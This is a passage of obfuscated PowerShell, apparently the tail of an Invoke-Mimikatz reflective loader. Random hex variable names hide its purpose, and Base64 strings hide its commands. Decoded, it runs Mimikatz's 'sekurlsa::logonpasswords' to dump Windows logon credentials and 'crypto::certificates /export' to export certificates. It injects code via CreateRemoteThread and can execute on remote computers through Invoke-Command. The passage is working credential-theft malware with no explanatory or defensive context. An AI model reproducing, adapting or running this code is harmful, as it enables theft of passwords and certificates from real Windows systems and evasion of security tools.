			${7136749d9ce64f46ae0440186d4f6c1c} = Invoke-CreateRemoteThread -d5e70cc477d14906a24cf0452a1000e4 ${bc96a39c79d24a35b88ba52e143fe2a2} -dfccdc8a8c7748d3bab1a84f860772a5 ${86dbf0f709ed4627b6a61a3282e52f88} -a36b17e7e2e643b69f9b9e1a2bd60bb9 ${a36b17e7e2e643b69f9b9e1a2bd60bb9}
		}
		if (${bc96a39c79d24a35b88ba52e143fe2a2} -eq [IntPtr]::Zero)
		{
			Invoke-MemoryFreeLibrary -ae6ce24b24854af29680b1afe7ddb45a ${ae6ce24b24854af29680b1afe7ddb45a}
		}
		else
		{
			${aa485f490a6d4dbcb08ed9a0e7f41001} = ${a36b17e7e2e643b69f9b9e1a2bd60bb9}.VirtualFree.Invoke(${ae6ce24b24854af29680b1afe7ddb45a}, [UInt64]0, ${bf6addb5678a4306bbd927c2e94d4ede}.MEM_RELEASE)
			if (${aa485f490a6d4dbcb08ed9a0e7f41001} -eq $false)
			{
				Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAAVgBpAHIAdAB1AGEAbABGAHIAZQBlACAAbwBuACAAdABoAGUAIABQAEUAJwBzACAAbQBlAG0AbwByAHkALgAgAEMAbwBuAHQAaQBuAHUAaQBuAGcAIABhAG4AeQB3AGEAeQBzAC4A'))) -WarningAction Continue
			}
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAhAA==')))
	}
	Main
}
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))].IsPresent)
	{
		$DebugPreference  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
	}
	Write-Verbose "PowerShell ProcessID: $PID"
	if ($PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB1AG0AcABDAHIAZQBkAHMA'))))
	{
		${bb61a355ebca4b4caf1b861559415a52} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAGsAdQByAGwAcwBhADoAOgBsAG8AZwBvAG4AcABhAHMAcwB3AG8AcgBkAHMAIABlAHgAaQB0AA==')))
	}
    elseif ($PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB1AG0AcABDAGUAcgB0AHMA'))))
    {
        ${bb61a355ebca4b4caf1b861559415a52} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAHkAcAB0AG8AOgA6AGMAbgBnACAAYwByAHkAcAB0AG8AOgA6AGMAYQBwAGkAIAAiAGMAcgB5AHAAdABvADoAOgBjAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAgAC8AZQB4AHAAbwByAHQAIgAgACIAYwByAHkAcAB0AG8AOgA6AGMAZQByAHQAaQBmAGkAYwBhAHQAZQBzACAALwBlAHgAcABvAHIAdAAgAC8AcwB5AHMAdABlAG0AcwB0AG8AcgBlADoAQwBFAFIAVABfAFMAWQBTAFQARQBNAF8AUwBUAE8AUgBFAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQAiACAAZQB4AGkAdAA=')))
    }
    else
    {
        ${bb61a355ebca4b4caf1b861559415a52} = ${adb799f1415d42b6953138b9c21d4fbc}
    }
    [System.IO.Directory]::SetCurrentDirectory($pwd)
	if (${c1ecb6b88f3f408caf6c588ef0b66012} -eq $null -or ${c1ecb6b88f3f408caf6c588ef0b66012} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBcAHMAKgAkAA=='))))
	{
		icm -ScriptBlock ${42b7f380802a4ecb8f9c8da9d57b00ce} -ArgumentList @(${360960a075984de898e66eda1d968418}, ${e56b8ae36bd44ada8ecc03c11b928101}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZAA='))), 0, "", ${bb61a355ebca4b4caf1b861559415a52})
	}
	else
	{
		icm -ScriptBlock ${42b7f380802a4ecb8f9c8da9d57b00ce} -ArgumentList @(${360960a075984de898e66eda1d968418}, ${e56b8ae36bd44ada8ecc03c11b928101}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZAA='))), 0, "", ${bb61a355ebca4b4caf1b861559415a52}) -ComputerName ${c1ecb6b88f3f408caf6c588ef0b66012}
	}
}
Main
}